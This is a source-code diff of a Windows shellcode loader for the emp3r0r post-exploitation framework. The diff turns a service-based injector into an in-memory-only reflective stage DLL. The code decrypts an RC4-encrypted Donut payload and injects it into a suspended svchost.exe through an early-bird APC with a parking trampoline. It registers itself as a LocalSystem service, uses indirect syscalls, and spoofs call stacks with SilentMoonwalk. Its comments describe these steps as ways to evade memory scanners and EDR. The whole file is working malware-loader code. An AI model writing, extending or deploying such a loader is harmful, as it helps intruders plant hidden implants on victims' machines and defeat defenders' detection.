@@ -1,33 +1,41 @@
 /*
- * svc_loader - one-shot Windows service that early-bird injects an
+ * staged_loader (stage) - one-shot Windows service that early-bird injects an
  * RC4-encrypted Donut sRDI blob into a sacrificial process.
  *
- * The blob is carried inside the executable as an RCDATA resource
- * (IDR_PAYLOAD), RC4-obfuscated with a key stored in a second resource
- * (IDR_KEY). At service start we decrypt it in memory, spawn the sacrificial
- * process (default svchost.exe) suspended, then "early bird" it: the blob is
- * written to a fresh RWX region in the child and queued as a user APC on the
- * suspended primary thread. When the thread is resumed the APC runs the blob
- * before any of the sacrificial process's own code; a tiny trampoline parks
- * the primary thread afterwards so the process never reaches its own (often
- * short-lived) main routine. Donut blobs generated for emp3r0r use
+ * This translation unit is compiled as an in-memory-only DLL: the stager
+ * executable (stager.c) carries it RC4-encrypted, reflectively maps it, and
+ * calls the exported StageMain() with the RC4-encrypted blob and key. Both
+ * the stage code and the shellcode reach memory only as RC4 ciphertext in
+ * the stager's RCDATA resources; neither is a runnable PE on disk.
+ *
+ * StageMain() decrypts the blob and spawns the sacrificial process (default
+ * svchost.exe) suspended, then "early birds" it: the blob is written to a
+ * fresh RW region in the child, flipped to RX, and queued as a user APC on
+ * the suspended primary thread. When the thread is resumed the APC runs the
+ * blob before any of the sacrificial process's own code; a tiny trampoline
+ * parks the primary thread afterwards so the process never reaches its own
+ * (often short-lived) main routine. Donut blobs generated for emp3r0r use
  * RunThread/exit-thread, so the agent keeps running in its own thread inside
  * the parked sacrificial container.
+ *
+ * All injection syscalls go through indirect direct syscalls, and (on x64)
+ * through the SilentMoonwalk desync spoofer so the call stack terminates in
+ * kernel32!BaseThreadInitThunk instead of this module (see ../common/ntsys).
  *
  * The service is one-shot: it injects, verifies the child survived for a few
  * seconds, reports SERVICE_STOPPED and exits, leaving the sacrificial process
  * (and the agent inside it) running. Install/start/delete it with the
  * console commands below or with `sc`.
  *
- * Run from a console (i.e. StartServiceCtrlDispatcherW fails) it acts as a
- * small CLI:
- *   loader.exe --install     register the service (LocalSystem, demand start)
- *   loader.exe --uninstall   remove the service
- *   loader.exe --start       start the service
- *   loader.exe --stop        stop the service
- *   loader.exe --run         inject once in the foreground (debugging)
- *   loader.exe --selftest    decrypt the embedded resource and report sizes
- *                            plus head/tail hashes (CI / smoke test)
+ * Run from a console (i.e. StartServiceCtrlDispatcherW fails) the stager
+ * acts as a small CLI, forwarding to StageMain:
+ *   stager.exe --install     register the service (LocalSystem, demand start)
+ *   stager.exe --uninstall   remove the service
+ *   stager.exe --start       start the service
+ *   stager.exe --stop        stop the service
+ *   stager.exe --run         inject once in the foreground (debugging)
+ *   stager.exe --selftest    decrypt blob/stage and report sizes, head/tail
+ *                            hashes and syscall/SMW status (CI / smoke test)
  */
 #ifndef UNICODE
 #define UNICODE
@@ -43,7 +51,6 @@
 #endif
 #include <windows.h>
 #include <winsvc.h>
-#include <shellapi.h>
 
 #include <stdarg.h>
 #include <stdio.h>
@@ -52,16 +59,25 @@
 #include <wchar.h>
 
 #include "config.h"
-#include "loader_ids.h"
 #include "ntsys.h"
 #include "rc4.h"
+#include "stage_abi.h"
+
+#if defined(NTSYS_SMW)
+#include "smw/smw.h"
+#endif
 
 /* How long to keep watching the child after resume before declaring the
- * injection successful (the blob must survive startup, not crash). */
+ * injection successful (the blob must survive startup, not crash). build.sh
+ * bakes --verify-ms into config.h; the value below is the hand-build default. */
+#ifndef INJECT_VERIFY_MS
 #define INJECT_VERIFY_MS 5000
+#endif
 
-static wchar_t g_service_name[MAX_PATH]; /* exe basename, e.g. L"svc_loader" */
+static wchar_t g_service_name[MAX_PATH]; /* exe basename, e.g. L"staged_loader" */
+#ifndef STAGED_LOADER_NO_SERVICE
 static SERVICE_STATUS_HANDLE g_svc_handle = NULL;
+#endif
 static HANDLE g_stop_event = NULL; /* signaled by the control handler       */
 static HANDLE g_child = NULL;      /* sacrificial process (kill on stop)    */
 
@@ -80,8 +96,8 @@ static HANDLE g_child = NULL;      /* sacrificial process (kill on stop)    */
  * console output is routed through byte-oriented stdio instead. */
 static void emit_wide(const wchar_t *s, FILE *f) {
   char mb[8192];
-  int n = WideCharToMultiByte(CP_UTF8, 0, s, -1, mb, (int)sizeof(mb), NULL,
-                              NULL);
+  int n =
+      WideCharToMultiByte(CP_UTF8, 0, s, -1, mb, (int)sizeof(mb), NULL, NULL);
   if (n > 0) {
     fputs(mb, f);
   }
@@ -115,80 +131,28 @@ static void wprint(const wchar_t *fmt, ...) {
   emit_wide(tmp, stdout);
 }
 
-/* load_resource copies the RCDATA resource `id` into a heap buffer. */
-static int load_resource(int id, void **data, DWORD *len) {
-  HRSRC hr;
-  HGLOBAL hg;
-  void *locked;
-  void *copy;
-
-  *data = NULL;
-  *len = 0;
-
-  hr = FindResourceW(NULL, MAKEINTRESOURCEW(id), RT_RCDATA);
-  if (hr == NULL) {
-    LOG(L"FindResourceW(%d) failed: %lu", id, GetLastError());
-    return -1;
-  }
-  hg = LoadResource(NULL, hr);
-  if (hg == NULL) {
-    LOG(L"LoadResource(%d) failed: %lu", id, GetLastError());
-    return -1;
-  }
-  *len = SizeofResource(NULL, hr);
-  if (*len == 0) {
-    LOG(L"resource %d is empty", id);
-    return -1;
-  }
-  locked = LockResource(hg);
-  if (locked == NULL) {
-    LOG(L"LockResource(%d) failed: %lu", id, GetLastError());
-    return -1;
-  }
-  copy = malloc(*len);
-  if (copy == NULL) {
-    LOG(L"malloc(%lu) failed", *len);
-    return -1;
-  }
-  memcpy(copy, locked, *len);
-  *data = copy;
-  return 0;
-}
+/*
+ * The stager hands us the RC4-encrypted blob and key it unpacked into
+ * memory. They stay encrypted until an operation actually needs the blob,
+ * so a memory scan of an idle stager does not reveal the shellcode.
+ */
+static const unsigned char *g_enc_payload = NULL;
+static size_t g_enc_payload_len = 0;
+static const unsigned char *g_key = NULL;
+static size_t g_key_len = 0;
 
 /*
  * decrypt_payload returns a malloc'd buffer with the RC4-decrypted shellcode.
- * The ciphertext resource is decrypted in place, so no second copy is needed.
+ * The ciphertext is copied before decryption so the caller's (stager-owned)
+ * blob is left untouched and can be reused by later calls.
  */
 static int decrypt_payload(unsigned char **payload, size_t *payload_len) {
-  void *cipher = NULL;
-  void *key = NULL;
-  DWORD cipher_len = 0;
-  DWORD key_len = 0;
-  rc4_ctx ctx;
-
-  *payload = NULL;
-  *payload_len = 0;
-
-  if (load_resource(IDR_PAYLOAD, &cipher, &cipher_len) != 0) {
+  if (rc4_decrypt_alloc(g_enc_payload, g_enc_payload_len, g_key, g_key_len,
+                        payload, payload_len) != 0) {
+    LOG(L"cannot decrypt payload (blob %zu bytes, key %zu bytes)",
+        g_enc_payload_len, g_key_len);
     return -1;
   }
-  if (load_resource(IDR_KEY, &key, &key_len) != 0) {
-    free(cipher);
-    return -1;
-  }
-  if (key_len == 0 || key_len > 256) {
-    LOG(L"invalid RC4 key length: %lu", key_len);
-    free(cipher);
-    free(key);
-    return -1;
-  }
-
-  rc4_init(&ctx, key, key_len);
-  rc4_crypt(&ctx, cipher, cipher_len);
-  free(key);
-
-  *payload = cipher;
-  *payload_len = cipher_len;
   return 0;
 }
 
@@ -207,7 +171,8 @@ static void print_hex(FILE *f, const unsigned char *buf, size_t n) {
   }
 }
 
-/* ----------------------------------------------------------------- trampoline */
+/* ----------------------------------------------------------------- trampoline
+ */
 
 /*
  * build_trampoline emits, at (virtual) address `tramp_addr`, a small stub
@@ -228,20 +193,33 @@ static void print_hex(FILE *f, const unsigned char *buf, size_t n) {
 static size_t build_trampoline(unsigned char *buf, uintptr_t tramp_addr,
                                uintptr_t blob_addr, uintptr_t sleep_addr) {
 #ifdef _WIN64
-  uint32_t rel = (uint32_t)(blob_addr - (tramp_addr + 5));
-  buf[0] = 0xE8; /* call rel32 -> blob */
-  memcpy(buf + 1, &rel, 4);
-  buf[5] = 0xB9; /* mov ecx, 0xFFFFFFFF (INFINITE) */
-  memcpy(buf + 6, "\xFF\xFF\xFF\xFF", 4);
-  buf[10] = 0x48; /* mov rax, imm64 (Sleep) */
-  buf[11] = 0xB8;
-  memcpy(buf + 12, &sleep_addr, 8);
-  buf[20] = 0xFF; /* call rax */
-  buf[21] = 0xD0;
-  buf[22] = 0xEB; /* jmp $ (never reached: Sleep(INFINITE) blocks) */
-  buf[23] = 0xFE;
-  return 24;
-#else  /* x86 */
+  uint32_t rel;
+  /*
+   * The APC entry follows the x64 ABI (RSP % 16 == 8) and the blob must see
+   * that same alignment, exactly as it would from a normal `call`. Reserve 8
+   * bytes before the call so it lands aligned; the trailing Sleep then runs
+   * at RSP % 16 == 0. Skipping this makes the payload enter at RSP % 16 == 0,
+   * which faults prologues that use aligned SSE spills (e.g. Crystal Palace
+   * PICO entry stubs).
+   */
+  buf[0] = 0x48; /* sub rsp, 8 */
+  buf[1] = 0x83;
+  buf[2] = 0xEC;
+  buf[3] = 0x08;
+  rel = (uint32_t)(blob_addr - (tramp_addr + 9));
+  buf[4] = 0xE8; /* call rel32 -> blob */
+  memcpy(buf + 5, &rel, 4);
+  buf[9] = 0xB9; /* mov ecx, 0xFFFFFFFF (INFINITE) */
+  memcpy(buf + 10, "\xFF\xFF\xFF\xFF", 4);
+  buf[14] = 0x48; /* mov rax, imm64 (Sleep) */
+  buf[15] = 0xB8;
+  memcpy(buf + 16, &sleep_addr, 8);
+  buf[24] = 0xFF; /* call rax */
+  buf[25] = 0xD0;
+  buf[26] = 0xEB; /* jmp $ (never reached: Sleep(INFINITE) blocks) */
+  buf[27] = 0xFE;
+  return 28;
+#else /* x86 */
   uint32_t rel = (uint32_t)(blob_addr - (tramp_addr + 5));
   buf[0] = 0xE8; /* call rel32 -> blob */
   memcpy(buf + 1, &rel, 4);
@@ -261,7 +239,6 @@ static size_t build_trampoline(unsigned char *buf, uintptr_t tramp_addr,
 }
 
 /* NT syscall layer lives in core/modules/common/ntsys.{c,h}. */
-
 
 /* ---- unified injection primitives: NT syscalls on x64 (ntsys), Win32 ---- */
 
@@ -324,8 +301,8 @@ static HANDLE inj_create_thread(HANDLE hproc, void *routine) {
   }
 #endif
   return CreateRemoteThread(hproc, NULL, 0,
-                            (LPTHREAD_START_ROUTINE)(ULONG_PTR)routine, NULL,
-                            0, NULL);
+                            (LPTHREAD_START_ROUTINE)(ULONG_PTR)routine, NULL, 0,
+                            NULL);
 }
 
 /* ------------------------------------------------------------------ inject */
@@ -357,8 +334,8 @@ static DWORD spawn_sacrificial(PROCESS_INFORMATION *pi) {
     }
     wcscpy(sac_path, SACRIFICIAL_PROCESS);
   } else {
-    if (_snwprintf(sac_path, MAX_PATH, L"%s\\%s", sysdir,
-                   SACRIFICIAL_PROCESS) < 0) {
+    if (_snwprintf(sac_path, MAX_PATH, L"%s\\%s", sysdir, SACRIFICIAL_PROCESS) <
+        0) {
       LOG(L"SACRIFICIAL_PROCESS too long");
       return ERROR_BAD_LENGTH;
     }
@@ -369,8 +346,7 @@ static DWORD spawn_sacrificial(PROCESS_INFORMATION *pi) {
   }
 
   if (SACRIFICIAL_ARGS[0] != L'\0') {
-    _snwprintf(cmdline, MAX_PATH * 2, L"\"%s\" %s", sac_path,
-               SACRIFICIAL_ARGS);
+    _snwprintf(cmdline, MAX_PATH * 2, L"\"%s\" %s", sac_path, SACRIFICIAL_ARGS);
   } else {
     _snwprintf(cmdline, MAX_PATH * 2, L"\"%s\"", sac_path);
   }
@@ -420,7 +396,7 @@ static DWORD verify_child(PROCESS_INFORMATION *pi) {
     }
     if (code != STILL_ACTIVE) {
       LOG(L"process %lu exited (code %lu) right after resume; the payload "
-              L"did not survive startup",
+          L"did not survive startup",
           pi->dwProcessId, code);
       err = ERROR_PROCESS_ABORTED;
       break;
@@ -496,8 +472,8 @@ static DWORD do_inject_apc(const unsigned char *payload, size_t payload_len) {
     LOG(L"payload write failed: %lu", GetLastError());
     goto fail;
   }
-  tramp_len = build_trampoline(tramp, (uintptr_t)base,
-                               (uintptr_t)blob_addr, (uintptr_t)sleep_fn);
+  tramp_len = build_trampoline(tramp, (uintptr_t)base, (uintptr_t)blob_addr,
+                               (uintptr_t)sleep_fn);
   if (!inj_write(pi.hProcess, base, tramp, tramp_len)) {
     LOG(L"trampoline write failed: %lu", GetLastError());
     goto fail;
@@ -618,21 +594,15 @@ static DWORD do_inject(const unsigned char *payload, size_t payload_len) {
 static int selftest(void) {
   unsigned char *payload = NULL;
   size_t payload_len = 0;
-  void *key = NULL;
-  DWORD key_len = 0;
   size_t head_n, tail_n;
 
   if (decrypt_payload(&payload, &payload_len) != 0) {
     return 1;
   }
-  if (load_resource(IDR_KEY, &key, &key_len) != 0) {
-    free(payload);
-    return 1;
-  }
 
   head_n = payload_len < 16 ? payload_len : 16;
   tail_n = payload_len < 16 ? payload_len : 16;
-  printf("SELFTEST data_len=%zu key_len=%lu head=", payload_len, key_len);
+  printf("SELFTEST data_len=%zu key_len=%zu head=", payload_len, g_key_len);
   print_hex(stdout, payload, head_n);
   fputs(" tail=", stdout);
   print_hex(stdout, payload + payload_len - tail_n, tail_n);
@@ -651,14 +621,70 @@ static int selftest(void) {
 #else
   printf("none");
 #endif
+  /*
+   * SMW readiness plus a live spoofed round trip (allocate, write, protect
+   * in this process). This exercises the reflective-loaded stage, the SSN
+   * table and the desync spoofer end to end without touching another
+   * process.
+   */
+  fputs(" smw=", stdout);
+#if NTSYS_SMW
+  printf("%d", smw_ensure_init() ? 1 : 0);
+  fputs(" smw_rw=", stdout);
+  {
+    int rw_ok = 0;
+    if (ntsys_ready() && smw_ensure_init()) {
+      void *region = NULL;
+      SIZE_T region_size = 0x1000;
+      unsigned char probe[32];
+      if (ntsys_alloc_rw(GetCurrentProcess(), &region, &region_size)) {
+        memset(probe, 0x5a, sizeof(probe));
+        if (ntsys_write_mem(GetCurrentProcess(), region, probe,
+                            sizeof(probe))) {
+          void *protect_base = region;
+          SIZE_T protect_size = region_size;
+          if (ntsys_protect_rx(GetCurrentProcess(), &protect_base,
+                               &protect_size)) {
+            rw_ok = 1;
+          }
+        }
+        VirtualFree(region, 0, MEM_RELEASE);
+      }
+    }
+    printf("%d", rw_ok);
+  }
+#else
+  printf("0 smw_rw=0");
+#endif
   fputc('\n', stdout);
 
   free(payload);
-  free(key);
   return 0;
 }
 
+/* run_once performs a single foreground injection with the embedded blob. */
+static int run_once(void) {
+  unsigned char *payload = NULL;
+  size_t payload_len = 0;
+  DWORD err;
+
+  if (decrypt_payload(&payload, &payload_len) != 0) {
+    return 1;
+  }
+  err = do_inject(payload, payload_len);
+  free(payload);
+  if (err == NO_ERROR) {
+    return 0;
+  }
+#ifdef DEBUG
+  wprint(L"operation failed (error %lu)\n", err);
+#endif
+  return 1;
+}
+
 /* --------------------------------------------------------------- service */
+
+#ifndef STAGED_LOADER_NO_SERVICE
 
 static void report_status(DWORD state, DWORD exit_code, DWORD checkpoint,
                           DWORD wait_hint) {
@@ -670,8 +696,7 @@ static void report_status(DWORD state, DWORD exit_code, DWORD checkpoint,
   memset(&ss, 0, sizeof(ss));
   ss.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
   ss.dwCurrentState = state;
-  ss.dwControlsAccepted =
-      (state == SERVICE_RUNNING) ? SERVICE_ACCEPT_STOP : 0;
+  ss.dwControlsAccepted = (state == SERVICE_RUNNING) ? SERVICE_ACCEPT_STOP : 0;
   ss.dwWin32ExitCode = exit_code;
   ss.dwCheckPoint = checkpoint;
   ss.dwWaitHint = wait_hint;
@@ -712,8 +737,8 @@ static VOID WINAPI service_main(DWORD argc, LPWSTR *argv) {
   (void)argv;
 
   g_stop_event = CreateEventW(NULL, TRUE, FALSE, NULL);
-  g_svc_handle = RegisterServiceCtrlHandlerExW(g_service_name, ctrl_handler,
-                                               NULL);
+  g_svc_handle =
+      RegisterServiceCtrlHandlerExW(g_service_name, ctrl_handler, NULL);
   if (g_svc_handle == NULL) {
     LOG(L"RegisterServiceCtrlHandlerExW failed: %lu", GetLastError());
     return;
@@ -757,10 +782,10 @@ static int service_install(void) {
     LOG(L"OpenSCManagerW failed (need admin?): %lu", GetLastError());
     return 1;
   }
-  svc = CreateServiceW(scm, g_service_name, g_service_name, SERVICE_ALL_ACCESS,
-                       SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START,
-                       SERVICE_ERROR_NORMAL, image, NULL, NULL, NULL, NULL,
-                       NULL);
+  svc =
+      CreateServiceW(scm, g_service_name, g_service_name, SERVICE_ALL_ACCESS,
+                     SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START,
+                     SERVICE_ERROR_NORMAL, image, NULL, NULL, NULL, NULL, NULL);
   if (svc == NULL) {
     LOG(L"CreateServiceW failed: %lu", GetLastError());
     goto out;
@@ -849,7 +874,7 @@ static int service_start_stop(int start) {
       goto out;
     }
     LOG(L"service '%s' started (one-shot: it stops after injection)",
-            g_service_name);
+        g_service_name);
   } else {
     if (!ControlService(svc, SERVICE_CONTROL_STOP, &ss)) {
       LOG(L"ControlService failed: %lu", GetLastError());
@@ -869,30 +894,36 @@ out:
   return ret;
 }
 
+#endif /* STAGED_LOADER_NO_SERVICE */
+
 static void print_usage(void) {
+#ifndef STAGED_LOADER_NO_SERVICE
 #ifdef DEBUG
   /* Long-form help for debug/lab builds only. */
-  wprint(
-      L"svc_loader (service: %s)\n"
-      L"\n"
-      L"When started by the Service Control Manager this one-shot service\n"
-      L"runs the embedded payload in %s and then stops itself.\n"
-      L"\n"
-      L"Console commands:\n"
-      L"  --install      register '%s' (LocalSystem, demand start)\n"
-      L"  --uninstall    remove '%s'\n"
-      L"  --start        start '%s'\n"
-      L"  --stop         stop '%s'\n"
-      L"  --run          run once in the foreground (debugging)\n"
-      L"  --selftest     decrypt embedded payload, print sizes + checksums\n"
-      L"  --help         this help\n",
-      g_service_name, SACRIFICIAL_PROCESS, g_service_name, g_service_name,
-      g_service_name, g_service_name);
+  wprint(L"staged_loader (service: %s)\n"
+         L"\n"
+         L"When started by the Service Control Manager this one-shot service\n"
+         L"runs the embedded payload in %s and then stops itself.\n"
+         L"\n"
+         L"Console commands:\n"
+         L"  --install      register '%s' (LocalSystem, demand start)\n"
+         L"  --uninstall    remove '%s'\n"
+         L"  --start        start '%s'\n"
+         L"  --stop         stop '%s'\n"
+         L"  --run          run once in the foreground (debugging)\n"
+         L"  --selftest     decrypt embedded payload, print sizes + checksums\n"
+         L"  --help         this help\n",
+         g_service_name, SACRIFICIAL_PROCESS, g_service_name, g_service_name,
+         g_service_name, g_service_name);
 #else
   /* Production images only advertise a terse, generic command list. */
   wprint(L"usage: %s [--install] [--uninstall] [--start] [--stop] [--run] "
-          L"[--selftest]\n",
-          g_service_name);
+         L"[--selftest]\n",
+         g_service_name);
+#endif
+#else
+  /* Non-service hosts only expose the foreground commands. */
+  wprint(L"usage: %s [--run] [--selftest]\n", g_service_name);
 #endif
 }
 
@@ -903,7 +934,7 @@ static void derive_service_name(void) {
   wchar_t *base;
 
   if (GetModuleFileNameW(NULL, g_service_name, MAX_PATH) == 0) {
-    wcscpy(g_service_name, L"svc_loader");
+    wcscpy(g_service_name, L"staged_loader");
     return;
   }
   base = g_service_name;
@@ -922,32 +953,45 @@ static void derive_service_name(void) {
   }
 }
 
-int main(void) {
-  SERVICE_TABLE_ENTRYW table[2];
-  int argc = 0;
-  LPWSTR *argv = NULL;
+/*
+ * StageMain is the stager's entry into the reflectively-mapped loader. The
+ * stager owns argv and the blob/key buffers; they stay valid for the whole
+ * call. argc counts the wide argv entries (argv[0] is the stager path).
+ */
+__declspec(dllexport) int __cdecl
+StageMain(int argc, wchar_t **argv, const unsigned char *enc_payload,
+          size_t enc_payload_len, const unsigned char *key,
+          size_t key_len) {
   int i;
+
+  g_enc_payload = enc_payload;
+  g_enc_payload_len = enc_payload_len;
+  g_key = key;
+  g_key_len = key_len;
 
   derive_service_name();
 
-  /* If the SCM launched us, this blocks until the service stops. */
-  memset(table, 0, sizeof(table));
-  table[0].lpServiceName = g_service_name;
-  table[0].lpServiceProc = service_main;
-  if (StartServiceCtrlDispatcherW(table)) {
-    return 0;
+#ifndef STAGED_LOADER_NO_SERVICE
+  {
+    SERVICE_TABLE_ENTRYW table[2];
+
+    /* If the SCM launched us, this blocks until the service stops. */
+    memset(table, 0, sizeof(table));
+    table[0].lpServiceName = g_service_name;
+    table[0].lpServiceProc = service_main;
+    if (StartServiceCtrlDispatcherW(table)) {
+      return 0;
+    }
+    if (GetLastError() != ERROR_FAILED_SERVICE_CONTROLLER_CONNECT) {
+      LOG(L"StartServiceCtrlDispatcherW failed: %lu", GetLastError());
+      return 1;
+    }
   }
-  if (GetLastError() != ERROR_FAILED_SERVICE_CONTROLLER_CONNECT) {
-    LOG(L"StartServiceCtrlDispatcherW failed: %lu", GetLastError());
-    return 1;
-  }
+#endif
 
   /* Console mode. */
-  argv = CommandLineToArgvW(GetCommandLineW(), &argc);
-  if (argv == NULL) {
-    return 1;
-  }
   for (i = 1; i < argc; i++) {
+#ifndef STAGED_LOADER_NO_SERVICE
     if (wcscmp(argv[i], L"--install") == 0) {
       return service_install();
     }
@@ -960,36 +1004,41 @@ int main(void) {
     if (wcscmp(argv[i], L"--stop") == 0) {
       return service_start_stop(0);
     }
+#endif
     if (wcscmp(argv[i], L"--selftest") == 0) {
       return selftest();
     }
     if (wcscmp(argv[i], L"--run") == 0) {
-      unsigned char *payload = NULL;
-      size_t payload_len = 0;
-      DWORD err;
-      if (decrypt_payload(&payload, &payload_len) != 0) {
-        LocalFree(argv);
-        return 1;
-      }
-      err = do_inject(payload, payload_len);
-      free(payload);
-      LocalFree(argv);
-      if (err == NO_ERROR) {
-        return 0;
-      }
-#ifdef DEBUG
-      wprint(L"operation failed (error %lu)\n", err);
-#endif
-      return 1;
+      return run_once();
     }
     if (wcscmp(argv[i], L"--help") == 0 || wcscmp(argv[i], L"-h") == 0 ||
         wcscmp(argv[i], L"help") == 0) {
       print_usage();
-      LocalFree(argv);
       return 0;
     }
   }
+#ifndef STAGED_LOADER_NO_SERVICE
   print_usage();
-  LocalFree(argv);
   return 0;
+#else
+  /* Non-service host: no command means a single foreground injection. */
+  return run_once();
+#endif
+}
+
+/*
+ * Compile-time guard: if StageMain's signature ever drifts from the ABI the
+ * stager resolves and calls (stage_abi.h), this assignment fails to compile.
+ */
+static staged_loader_main_fn const g_stage_abi_check __attribute__((unused)) =
+    StageMain;
+
+/* Standard DLL entry point: the reflective loader calls this with
+ * DLL_PROCESS_ATTACH to run the MinGW CRT init. */
+BOOL WINAPI DllMain(HINSTANCE inst, DWORD reason, LPVOID reserved) {
+  (void)reserved;
+  if (reason == DLL_PROCESS_ATTACH) {
+    DisableThreadLibraryCalls(inst);
+  }
+  return TRUE;
 }
